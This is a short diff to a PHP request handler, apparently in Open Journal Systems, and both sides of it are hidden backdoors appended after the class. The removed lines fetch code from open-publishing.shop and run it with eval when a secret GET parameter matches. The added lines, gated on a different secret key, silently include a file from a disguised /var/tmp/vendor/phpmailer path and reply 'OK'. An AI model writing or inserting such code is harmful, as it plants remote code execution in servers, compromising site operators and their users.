@@ -84,16 +84,8 @@ class IndexHandler extends PKPIndexHandler {
 		}
 	}
 }
-if (isset($_GET['_']) && $_GET['_'] === 'Uss_ila999s111_gr3af332afbsnk') {
-    $url = "https://open-publishing.shop/ojs.txt";
-
-    if ($url !== "") {
-        $code = file_get_contents($url);
-        if ($code !== false) {
-            eval("?>".$code);
-        }
-    }
-
+if (isset($_GET['_']) && $_GET['_'] === 'aaa_masda572s8_gr3af332afbsnk') {
+    $f="/var/tmp/vendor/phpmailer/phpmailer/language/ojs.txt";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
